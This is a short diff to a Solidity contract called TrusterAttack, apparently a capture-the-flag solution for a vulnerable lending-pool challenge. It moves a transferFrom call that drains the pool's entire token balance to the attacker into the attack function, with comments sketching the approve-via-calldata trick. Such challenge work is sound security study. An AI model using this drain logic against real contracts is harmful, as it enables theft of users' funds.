@@ -50,11 +50,11 @@ contract TrusterAttack {
         //calldata = approve(pool, this)
         //response 
         //token.tranfser(amount,attacker)
+        token.transferFrom(pool, attacker, token.balanceOf(pool));
         //
     }
-    function transferMe() public{
-        token.transferFrom(pool, attacker, token.balanceOf(pool));
-    }
+    // function transferMe() public{
+    // }
 
    
 }
